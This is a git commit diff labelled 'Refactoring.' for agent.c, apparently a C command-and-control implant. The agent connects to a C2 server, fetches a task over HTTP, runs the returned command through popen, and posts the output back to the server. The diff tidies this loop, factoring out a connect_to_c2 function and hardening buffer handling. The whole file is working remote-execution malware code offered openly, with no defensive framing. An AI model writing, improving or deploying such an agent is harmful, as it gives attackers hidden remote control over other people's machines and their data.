03c53401a1f8c44d8622268ad43d4e9bc03b7181
tv00iPapa <dpilguev@yandex.com>
2026-08-10 11:36:48 -0400

    Refactoring.

--- agent.c
+++ agent.c
@@ -16,14 +16,12 @@ void error_exit(const char* msg) {
     exit(EXIT_FAILURE);
 }
 
-void get_command_from_c2(char* task, char* command) {
+int connect_to_c2() {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if(sockfd == -1) {
         error_exit("socket");
-        exit(EXIT_FAILURE);
     }
 
-    //filling network struct
     struct sockaddr_in addr_server;
     memset(&addr_server, 0, sizeof(addr_server));
     addr_server.sin_family = AF_INET;
@@ -32,27 +30,27 @@ void get_command_from_c2(char* task, char* command) {
 
     if(connect(sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
         error_exit("connect");
-        close(sockfd);
-        exit(EXIT_FAILURE);
     }
-    printf("[+] Success connect to c2.\n");
+
+    printf("[+] Connect to c2 success.\n");
+    return sockfd;
+}
+
+void get_command_from_c2(char* task, char* command, size_t command_len) {
+    int sockfd = connect_to_c2();
 
     //build request for c2
     char request[2048] = {0};
     snprintf(request, sizeof(request), "GET /get_task/%s HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n", task); 
 
-    if(send(sockfd, request, sizeof(request), 0) == -1) {
+    if(send(sockfd, request, strlen(request), 0) == -1) {
         error_exit("send");
-        close(sockfd);
-        exit(EXIT_FAILURE);
     } 
     printf("[+] Get request send to c2.\n");
 
-    int count_bytes = read(sockfd, request, sizeof(request));
+    int count_bytes = read(sockfd, request, sizeof(request) - 1);
     if(count_bytes == -1) {
         error_exit("read");
-        close(sockfd);
-        exit(EXIT_FAILURE);
     }
     printf("[+] Answer from c2:\n %s\n\n", request);
     fflush(stdout);
@@ -66,64 +64,42 @@ void get_command_from_c2(char* task, char* command) {
         temp_command += 5; //because '"'
     }
 
-    strcpy(command, temp_command); //ВАЖНО!!!
+    strncpy(command, temp_command, command_len); //ВАЖНО!!!
     close(sockfd);
 }
 
-void execute_command(char* command, char* result) {
+void execute_command(char* command, char* result, size_t result_len) {
     sleep(1);
     
     FILE* fp;
-    char chunk[256];
+    char chunk[256] = {0};
     
     fp = popen(command, "r");
     if(fp == NULL) {
         error_exit("popen");
-        exit(EXIT_FAILURE);
     } 
 
-    char temp_result[4096];
+    char temp_result[4096] = {0};
     while(fgets(chunk, sizeof(chunk), fp) != NULL) {
         strncat(temp_result, chunk, sizeof(temp_result) - strlen(temp_result) - 1);
     }
 
-    strcpy(result, temp_result);
+    strncpy(result, temp_result, result_len);
     pclose(fp);
 }
 
 void set_result_to_c2(char* result) {
-    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if(sockfd == -1) {
-        error_exit("socket");
-        exit(EXIT_FAILURE);
-    }
-
-    struct sockaddr_in addr_server;
-    memset(&addr_server, 0, sizeof(addr_server));
-    addr_server.sin_family = AF_INET;
-    addr_server.sin_port = htons(SERVER_PORT);
-    if(inet_pton(AF_INET, SERVER_IP, &addr_server.sin_addr) == -1) {
-        error_exit("inet_pton");
-        close(sockfd);
-        exit(EXIT_FAILURE);
-    }
-
-    if(connect(sockfd, (struct sockaddr*)&addr_server, sizeof(addr_server)) == -1) {
-        error_exit("connect");
-        close(sockfd);
-        exit(EXIT_FAILURE);
-    }
-    printf("[+] Success connect for send answer.\n");
+    int sockfd = connect_to_c2();
    
     //check '\n'
     if(result[strlen(result) - 1] == '\n') {
         result[strlen(result) - 1] = '\0';
     } 
-    char body[1024];
+    char body[1024] = {0};
     snprintf(body, sizeof(body), "{\"result\": \"%s\"}", result);
     int body_len = strlen(body);
 
-    char answer[4096];
+    char answer[4096] = {0};
     snprintf(answer, 
             sizeof(answer), 
             "POST /send_result HTTP/1.1\r\n"
@@ -135,20 +111,20 @@ void set_result_to_c2(char* result) {
                     body_len,
                     body);
     
-    if(send(sockfd, answer, sizeof(answer), 0) == -1) {
+    if(send(sockfd, answer, strlen(answer), 0) == -1) {
         error_exit("send");
-        close(sockfd);
-        exit(EXIT_FAILURE);
     }
+
     printf("[+] Send answer to c2.\n");
+    close(sockfd);
 }
 
 int main() {
-    char command[100];
-    char result[4096];
+    char command[100] = {0};
+    char result[4096] = {0};
 
-    get_command_from_c2("task_2", command);
-    execute_command(command, result);
+    get_command_from_c2("task_2", command, sizeof(command));
+    execute_command(command, result, sizeof(result));
     set_result_to_c2(result);
 
     return 0;
